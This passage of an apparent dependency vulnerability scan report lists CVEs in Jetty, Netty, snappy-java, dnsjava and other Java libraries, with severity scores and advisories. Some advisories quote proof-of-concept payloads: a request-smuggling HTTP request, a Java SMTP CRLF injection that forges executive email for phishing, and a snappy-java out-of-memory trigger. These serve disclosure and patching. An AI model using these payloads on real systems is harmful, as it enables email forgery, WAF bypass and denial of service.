Jetty accepts the '+' character proceeding the content-length value in a HTTP/1 header field. This is more permissive than allowed by the RFC and other servers routinely reject such requests with 400 responses. There is no known exploit scenario, but it is conceivable that request smuggling could result if jetty is used in combination with a server that does not close the connection after sending such a 400 response.

### Workarounds

There is no workaround as there is no known exploit scenario. 

### Original Report 

[RFC 9110 Secion 8.6](https://www.rfc-editor.org/rfc/rfc9110#section-8.6) defined the value of Content-Length header should be a string of 0-9 digits. However we found that Jetty accepts "+" prefixed Content-Length, which could lead to potential HTTP request smuggling.

Payload:

```
 POST / HTTP/1.1
 Host: a.com
 Content-Length: +16
 Connection: close
 ​
 0123456789abcdef
```

When sending this payload to Jetty, it can successfully parse and identify the length.

When sending this payload to NGINX, Apache HTTPd or other HTTP servers/parsers, they will return 400 bad request.

This behavior can lead to HTTP request smuggling and can be leveraged to bypass WAF or IDS.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.eclipse.jetty/jetty-server</strong> <code>9.4.52.v20230823</code> (maven)</summary>

<small><code>pkg:maven/org.eclipse.jetty/jetty-server@9.4.52.v20230823</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-13009?s=github&n=jetty-server&ns=org.eclipse.jetty&t=maven&vr=%3E%3D9.4.0%2C%3C%3D9.4.56"><img alt="high 7.2: CVE--2024--13009" src="https://img.shields.io/badge/CVE--2024--13009-lightgrey?label=high%207.2&labelColor=e25d68"/></a> <i>Improper Resource Shutdown or Release</i>

<table>
<tr><td>Affected range</td><td><code>>=9.4.0<br/><=9.4.56</code></td></tr>
<tr><td>Fixed version</td><td><code>9.4.57.v20241219</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.074%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In Eclipse Jetty versions 9.4.0 to 9.4.56 a buffer can be incorrectly released when confronted with a gzip error when inflating a request body. This can result in corrupted and/or inadvertent sharing of data between requests.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-8184?s=github&n=jetty-server&ns=org.eclipse.jetty&t=maven&vr=%3E%3D9.3.12%2C%3C%3D9.4.55"><img alt="medium 5.9: CVE--2024--8184" src="https://img.shields.io/badge/CVE--2024--8184-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=9.3.12<br/><=9.4.55</code></td></tr>
<tr><td>Fixed version</td><td><code>9.4.56</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.487%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>81st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
Remote DOS attack can cause out of memory 

### Description
There exists a security vulnerability in Jetty's `ThreadLimitHandler.getRemote()` which
can be exploited by unauthorized users to cause remote denial-of-service (DoS) attack.  By
repeatedly sending crafted requests, attackers can trigger OutofMemory errors and exhaust the
server's memory.

### Affected Versions

* Jetty 12.0.0-12.0.8 (Supported)
* Jetty 11.0.0-11.0.23 (EOL)
* Jetty 10.0.0-10.0.23 (EOL)
* Jetty 9.3.12-9.4.55 (EOL)

### Patched Versions

* Jetty 12.0.9
* Jetty 11.0.24
* Jetty 10.0.24
* Jetty 9.4.56

### Workarounds

Do not use `ThreadLimitHandler`.  
Consider use of `QoSHandler` instead to artificially limit resource utilization.

### References

Jetty 12 - https://github.com/jetty/jetty.project/pull/11723

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>com.nimbusds/nimbus-jose-jwt</strong> <code>9.8.1</code> (maven)</summary>

<small><code>pkg:maven/com.nimbusds/nimbus-jose-jwt@9.8.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-52428?s=github&n=nimbus-jose-jwt&ns=com.nimbusds&t=maven&vr=%3C9.37.2"><img alt="high 8.7: CVE--2023--52428" src="https://img.shields.io/badge/CVE--2023--52428-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code><9.37.2</code></td></tr>
<tr><td>Fixed version</td><td><code>9.37.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.078%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In Connect2id Nimbus JOSE+JWT before 9.37.2, an attacker can cause a denial of service (resource consumption) via a large JWE p2c header value (aka iteration count) for the PasswordBasedDecrypter (PBKDF2) component.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-53864?s=github&n=nimbus-jose-jwt&ns=com.nimbusds&t=maven&vr=%3C9.37.4"><img alt="medium 5.8: CVE--2025--53864" src="https://img.shields.io/badge/CVE--2025--53864-lightgrey?label=medium%205.8&labelColor=fbb552"/></a> <i>Uncontrolled Recursion</i>

<table>
<tr><td>Affected range</td><td><code><9.37.4</code></td></tr>
<tr><td>Fixed version</td><td><code>10.0.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.044%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Connect2id Nimbus JOSE + JWT before 10.0.2 allows a remote attacker to cause a denial of service via a deeply nested JSON object supplied in a JWT claim set, because of uncontrolled recursion. NOTE: this is independent of the Gson 2.11.0 issue because the Connect2id product could have checked the JSON object nesting depth, regardless of what limits (if any) were imposed by Gson.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>com.fasterxml.jackson.core/jackson-core</strong> <code>2.13.4</code> (maven)</summary>

<small><code>pkg:maven/com.fasterxml.jackson.core/jackson-core@2.13.4</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-52999?s=github&n=jackson-core&ns=com.fasterxml.jackson.core&t=maven&vr=%3C2.15.0"><img alt="high 8.7: CVE--2025--52999" src="https://img.shields.io/badge/CVE--2025--52999-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Stack-based Buffer Overflow</i>

<table>
<tr><td>Affected range</td><td><code><2.15.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.15.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.030%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
With older versions  of jackson-core, if you parse an input file and it has deeply nested data, Jackson could end up throwing a StackoverflowError if the depth is particularly large.

### Patches
jackson-core 2.15.0 contains a configurable limit for how deep Jackson will traverse in an input document, defaulting to an allowable depth of 1000. Change is in https://github.com/FasterXML/jackson-core/pull/943. jackson-core will throw a StreamConstraintsException if the limit is reached.
jackson-databind also benefits from this change because it uses jackson-core to parse JSON inputs.

### Workarounds
Users should avoid parsing input files from untrusted sources.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>io.netty/netty-codec-smtp</strong> <code>4.1.96.Final</code> (maven)</summary>

<small><code>pkg:maven/io.netty/netty-codec-smtp@4.1.96.Final</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-59419?s=github&n=netty-codec-smtp&ns=io.netty&t=maven&vr=%3C4.1.128.Final"><img alt="high 7.7: CVE--2025--59419" src="https://img.shields.io/badge/CVE--2025--59419-lightgrey?label=high%207.7&labelColor=e25d68"/></a> <i>Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</i>

<table>
<tr><td>Affected range</td><td><code><4.1.128.Final</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.128.Final</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P</code></td></tr>
<tr><td>EPSS Score</td><td><code>3.365%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>87th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
An SMTP Command Injection (CRLF Injection) vulnerability in Netty's SMTP codec allows a remote attacker who can control SMTP command parameters (e.g., an email recipient) to forge arbitrary emails from the trusted server. This bypasses standard email authentication and can be used to impersonate executives and forge high-stakes corporate communications.

### Details
The root cause is the lack of input validation for Carriage Return (\r) and Line Feed (\n) characters in user-supplied parameters.

The vulnerable code is in io.netty.handler.codec.smtp.DefaultSmtpRequest, where parameters are directly concatenated into the SMTP command string. For example, when SmtpRequests.rcpt(recipient) is called, a malicious recipient string containing CRLF sequences can inject a new, separate SMTP command.

Because the injected commands are sent from the server's trusted IP, any resulting emails will likely pass SPF and DKIM checks, making them appear legitimate to the victim's email client.

### PoC
A minimal PoC involves passing a crafted string containing CRLF sequences to any `SmtpRequest` that accepts user-controlled parameters.

**1. Malicious Payload**

The core of the exploit is the payload, where new SMTP commands are injected into a parameter.

```java
// The legitimate recipient is followed by an injected email sequence
String injected_recipient = "legit-recipient@example.com\r\n" +
                          "MAIL FROM:<ceo@trusted-domain.com>\r\n" +
                          "RCPT TO:<victim@anywhere.com>\r\n" +
                          "DATA\r\n" +
                          "From: ceo@trusted-domain.com\r\n" +
                          "To: victim@anywhere.com\r\n" +
                          "Subject: Urgent: Phishing Email\r\n" +
                          "\r\n" +
                          "This is a forged email that will pass authentication checks.\r\n" +
                          ".\r\n" +
                          "QUIT\r\n";
```

**2. Triggering the Vulnerability**

The vulnerability is triggered when this payload is used to create an SMTP request.

```java
// The Netty SMTP codec will fail to sanitize this input
SmtpRequest maliciousRequest = SmtpRequests.rcpt(injected_recipient);

// When this request is sent to an SMTP server, the injected commands
// will be executed, sending a forged email.
channel.writeAndFlush(maliciousRequest);
```

**3. Full Reproduction Steps**

A complete, runnable PoC is available as a GitHub Gist to demonstrate the full attack flow against a local SMTP server

*   **Full PoC Code:** https://gist.github.com/DepthFirstDisclosures/ddacca28cb94b48fa8ab998cef59ed8c

To run the full PoC:

1.  **Set up a local SMTP server.** The easiest way is using MailHog:
    *   On macOS: `brew install mailhog && mailhog`
    *   Using Docker: `docker run -p 1025:1025 -p 8025:8025 mailhog/mailhog`
2.  **Run the PoC code.** The code will connect to the SMTP server at `localhost:1025` and send the malicious payload.
3.  **Verify the result.** Open the MailHog web UI at `http://localhost:8025`. You will see the forged email sent to `victim@anywhere.com` from `ceo@trusted-domain.com`.

### Impact
This is a SMTP Command Injection vulnerability. It impacts any application using `netty-codec-smtp` to construct SMTP requests where an attacker can control or influence any of the SMTP string parameters (e.g., `from`, `recipient`, `helo` hostname).

The primary impacts are:
*   **Economic Manipulation & Disinformation:** Attackers can forge emails from high-value targets (e.g., corporate executives, government officials) and send them to journalists, financial institutions, or the public. A fraudulent email announcing false financial results, a fake merger, or a security breach could be used to manipulate stock prices or cause significant economic disruption.
*   **Sophisticated Phishing:** Attackers can send high-fidelity phishing emails that bypass email authentication (SPF/DKIM) and appear to come from a trusted source, making them highly likely to deceive users.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>com.google.protobuf/protobuf-java</strong> <code>3.23.4</code> (maven)</summary>

<small><code>pkg:maven/com.google.protobuf/protobuf-java@3.23.4</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-7254?s=github&n=protobuf-java&ns=com.google.protobuf&t=maven&vr=%3C3.25.5"><img alt="high 8.7: CVE--2024--7254" src="https://img.shields.io/badge/CVE--2024--7254-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Improper Input Validation</i>

<table>
<tr><td>Affected range</td><td><code><3.25.5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.25.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.085%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
When parsing unknown fields in the Protobuf Java Lite and Full library, a maliciously crafted message can cause a StackOverflow error and lead to a program crash.

Reporter: Alexis Challande, Trail of Bits Ecosystem Security Team <ecosystem@trailofbits.com>

Affected versions: This issue affects all versions of both the Java full and lite Protobuf runtimes, as well as Protobuf for Kotlin and JRuby, which themselves use the Java Protobuf runtime.

### Severity
[CVE-2024-7254](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-7254) **High** CVSS4.0 Score 8.7 (NOTE: there may be a delay in publication)
This is a potential Denial of Service. Parsing nested groups as unknown fields with DiscardUnknownFieldsParser or Java Protobuf Lite parser, or against Protobuf map fields, creates unbounded recursions that can be abused by an attacker.

### Proof of Concept
For reproduction details, please refer to the unit tests (Protobuf Java [LiteTest](https://github.com/protocolbuffers/protobuf/blob/a037f28ff81ee45ebe008c64ab632bf5372242ce/java/lite/src/test/java/com/google/protobuf/LiteTest.java) and [CodedInputStreamTest](https://github.com/protocolbuffers/protobuf/blob/a037f28ff81ee45ebe008c64ab632bf5372242ce/java/core/src/test/java/com/google/protobuf/CodedInputStreamTest.java)) that identify the specific inputs that exercise this parsing weakness.

### Remediation and Mitigation
We have been working diligently to address this issue and have released a mitigation that is available now. Please update to the latest available versions of the following packages:
* protobuf-java (3.25.5, 4.27.5, 4.28.2)
* protobuf-javalite (3.25.5, 4.27.5, 4.28.2)
* protobuf-kotlin (3.25.5, 4.27.5, 4.28.2)
* protobuf-kotlin-lite (3.25.5, 4.27.5, 4.28.2)
* com-protobuf [JRuby gem only] (3.25.5, 4.27.5, 4.28.2)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>commons-io/commons-io</strong> <code>2.11.0</code> (maven)</summary>

<small><code>pkg:maven/commons-io/commons-io@2.11.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-47554?s=github&n=commons-io&ns=commons-io&t=maven&vr=%3E%3D2.0%2C%3C2.14.0"><img alt="high 8.7: CVE--2024--47554" src="https://img.shields.io/badge/CVE--2024--47554-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=2.0<br/><2.14.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.14.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.173%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>39th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Uncontrolled Resource Consumption vulnerability in Apache Commons IO.

The `org.apache.commons.io.input.XmlStreamReader` class may excessively consume CPU resources when processing maliciously crafted input.


This issue affects Apache Commons IO: from 2.0 before 2.14.0.

Users are recommended to upgrade to version 2.14.0 or later, which fixes the issue.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>io.netty/netty-handler</strong> <code>4.1.94.Final</code> (maven)</summary>

<small><code>pkg:maven/io.netty/netty-handler@4.1.94.Final</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-24970?s=github&n=netty-handler&ns=io.netty&t=maven&vr=%3E%3D4.1.91.Final%2C%3C%3D4.1.117.Final"><img alt="high 7.5: CVE--2025--24970" src="https://img.shields.io/badge/CVE--2025--24970-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Input Validation</i>

<table>
<tr><td>Affected range</td><td><code>>=4.1.91.Final<br/><=4.1.117.Final</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.118.Final</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.347%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>57th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
When a special crafted packet is received via SslHandler it doesn't correctly handle validation of such a packet in all cases which can lead to a native crash.

### Workarounds
As workaround its possible to either disable the usage of the native SSLEngine or changing the code from:

```
SslContext context = ...;
SslHandler handler = context.newHandler(....);
```

to:

```
SslContext context = ...;
SSLEngine engine = context.newEngine(....);
SslHandler handler = new SslHandler(engine, ....);
```

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>io.airlift/aircompressor</strong> <code>0.25</code> (maven)</summary>

<small><code>pkg:maven/io.airlift/aircompressor@0.25</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-36114?s=github&n=aircompressor&ns=io.airlift&t=maven&vr=%3C0.27"><img alt="high 8.6: CVE--2024--36114" src="https://img.shields.io/badge/CVE--2024--36114-lightgrey?label=high%208.6&labelColor=e25d68"/></a> <i>Out-of-bounds Read</i>

<table>
<tr><td>Affected range</td><td><code><0.27</code></td></tr>
<tr><td>Fixed version</td><td><code>0.27</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.6</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.120%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
All decompressor implementations of Aircompressor (LZ4, LZO, Snappy, Zstandard) can crash the JVM for certain input, and in some cases also leak the content of other memory of the Java process (which could contain sensitive information).

### Details
When decompressing certain data, the decompressors try to access memory outside the bounds of the given byte arrays or byte buffers. Because Aircompressor uses the JDK class `sun.misc.Unsafe` to speed up memory access, no additional bounds checks are performed and this has similar security consequences as out-of-bounds access in C or C++, namely it can lead to non-deterministic behavior or crash the JVM.

Users should update to Aircompressor 0.27 or newer where these issues have been fixed.

### Impact
When decompressing data from untrusted users, this can be exploited for a denial-of-service attack by crashing the JVM, or to leak other sensitive information from the Java process.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.xerial.snappy/snappy-java</strong> <code>1.1.10.3</code> (maven)</summary>

<small><code>pkg:maven/org.xerial.snappy/snappy-java@1.1.10.3</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-43642?s=github&n=snappy-java&ns=org.xerial.snappy&t=maven&vr=%3C%3D1.1.10.3"><img alt="high 7.5: CVE--2023--43642" src="https://img.shields.io/badge/CVE--2023--43642-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code><=1.1.10.3</code></td></tr>
<tr><td>Fixed version</td><td><code>1.1.10.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.190%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

snappy-java is a data compression library in Java. Its SnappyInputStream was found to be vulnerable to Denial of Service (DoS) attacks when decompressing data with a too-large chunk size. Due to missing upper bound check on chunk length, an unrecoverable fatal error can occur. 

### Scope

All versions of snappy-java including the latest released version 1.1.10.3.  A fix is applied in 1.1.10.4

### Details
While performing mitigation efforts related to [CVE-2023-34455](https://nvd.nist.gov/vuln/detail/CVE-2023-34455) in Confluent products, our Application Security team closely analyzed the fix that was accepted and merged into snappy-java version 1.1.10.1 in [this](https://github.com/xerial/snappy-java/commit/3bf67857fcf70d9eea56eed4af7c925671e8eaea) commit. The check on [line 421](https://github.com/xerial/snappy-java/commit/3bf67857fcf70d9eea56eed4af7c925671e8eaea#diff-c3e53610267092989965e8c7dd2d4417d355ff7f560f9e8075b365f32569079fR421) only attempts to check if chunkSize is not a negative value. We believe that this is an inadequate fix as it misses an upper-bounds check for overly positive values such as 0x7FFFFFFF (or (2,147,483,647 in decimal) before actually [attempting to allocate](https://github.com/xerial/snappy-java/commit/3bf67857fcf70d9eea56eed4af7c925671e8eaea#diff-c3e53610267092989965e8c7dd2d4417d355ff7f560f9e8075b365f32569079fR429) the provided unverified number of bytes via the “chunkSize” variable. This missing upper-bounds check can lead to the applications depending upon snappy-java to allocate an inappropriate number of bytes on the heap which can then cause an  java.lang.OutOfMemoryError exception. Under some specific conditions and contexts, this can lead to a Denial-of-Service (DoS) attack with a direct impact on the availability of the dependent implementations based on the usage of the snappy-java library for compression/decompression needs.

### PoC
Compile and run the following code:
```
package org.example;
import org.xerial.snappy.SnappyInputStream;

import java.io.*;

public class Main {

    public static void main(String[] args) throws IOException {
        byte[] data = {-126, 'S', 'N', 'A', 'P', 'P', 'Y', 0, 0, 0, 0, 0, 0, 0, 0, 0,(byte) 0x7f, (byte) 0xff, (byte) 0xff, (byte) 0xff};
        SnappyInputStream in = new SnappyInputStream(new ByteArrayInputStream(data));
        byte[] out = new byte[50];
        try {
            in.read(out);
        }
        catch (Exception ignored) {
        }
    }
}
```

### Impact
Denial of Service of applications dependent on snappy-java especially if `ExitOnOutOfMemoryError` or `CrashOnOutOfMemoryError` is configured on the JVM.

### Credits
Jan Werner, Mukul Khullar and Bharadwaj Machiraju from Confluent's Application Security team. 

We kindly request for a new CVE ID to be assigned once you acknowledge this vulnerability.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>dnsjava/dnsjava</strong> <code>2.1.7</code> (maven)</summary>

<small><code>pkg:maven/dnsjava/dnsjava@2.1.7</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-25638?s=github&n=dnsjava&ns=dnsjava&t=maven&vr=%3C3.6.0"><img alt="high 7.0: CVE--2024--25638" src="https://img.shields.io/badge/CVE--2024--25638-lightgrey?label=high%207.0&labelColor=e25d68"/></a> <i>Insufficient Verification of Data Authenticity</i>

<table>
<tr><td>Affected range</td><td><code><3.6.0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.6.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.188%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

Records in DNS replies are not checked for their relevance to the query, allowing an attacker to respond with RRs from different zones.

### Details

DNS Messages are not authenticated. They do not guarantee that

- received RRs are authentic
- not received RRs do not exist
- all or any received records in a response relate to the request

Applications utilizing DNSSEC generally expect these guarantees to be met, however DNSSEC by itself only guarantees the first two.
To meet the third guarantee, resolvers generally follow an (undocumented, as far as RFCs go) algorithm such as: (simplified, e.g. lacks DNSSEC validation!)

1. denote by `QNAME` the name you are querying (e.g. fraunhofer.de.), and initialize a list of aliases
2. if the ANSWER section contains a valid PTR RRSet for `QNAME`, return it (and optionally return the list of aliases as well)
3. if the ANSWER section contains a valid CNAME RRSet for `QNAME`, add it to the list of aliases. Set `QNAME` to the CNAME's target and go to 2.
4. Verify that `QNAME` does not have any PTR, CNAME and DNAME records using valid NSEC or NSEC3 records. Return `null`.

Note that this algorithm relies on NSEC records and thus requires a considerable portion of the DNSSEC specifications to be implemented. For this reason, it cannot be performed by a DNS client (aka application) and is typically performed as part of the resolver logic.

dnsjava does not implement a comparable algorithm, and the provided APIs instead return either

- the received DNS message itself (e.g. when using a ValidatingResolver such as in [this](https://github.com/dnsjava/dnsjava/blob/master/EXAMPLES.md#dnssec-resolver) example), or
- essentially just the contents of its ANSWER section (e.g. when using a LookupSession such as in [this](https://github.com/dnsjava/dnsjava/blob/master/EXAMPLES.md#simple-lookup-with-a-resolver) example)

If applications blindly filter the received results for RRs of the desired record type (as seems to be typical usage for dnsjava), a rogue recursive resolver or (on UDP/TCP connections) a network attacker can

- In addition to the actual DNS response, add RRs irrelevant to the query but of the right datatype, e.g. from another zone, as long as that zone is correctly using DNSSEC, or
- completely exchange the relevant response records

### Impact

DNS(SEC) libraries are usually used as part of a larger security framework.
Therefore, the main misuses of this vulnerability concern application code, which might take the returned records as authentic answers to the request.
Here are three concrete examples of where this might be detrimental:

- [RFC 6186](https://datatracker.ietf.org/doc/html/rfc6186) specifies that to connect to an IMAP server for a user, a mail user agent should retrieve certain SRV records and send the user's credentials to the specified servers. Exchanging the SRV records can be a tool to redirect the credentials.
- When delivering mail via SMTP, MX records determine where to deliver the mails to. Exchanging the MX records might lead to information disclosure. Additionally, an exchange of TLSA records might allow attackers to intercept TLS traffic.
- Some research projects like [LIGHTest](https://www.lightest.eu/) are trying to manage CA trust stores via URI and SMIMEA records in the DNS. Exchanging these allows manipulating the root of trust for dependent applications.

### Mitigations

At this point, the following mitigations are recommended:

- When using a ValidatingResolver, ignore any Server indications of whether or not data was available (e.g. NXDOMAIN, NODATA, ...).
- For APIs returning RRs from DNS responses, filter the RRs using an algorithm such as the one above. This includes e.g. `LookupSession.lookupAsync`.
- Remove APIs dealing with raw DNS messages from the examples section or place a noticable warning above.

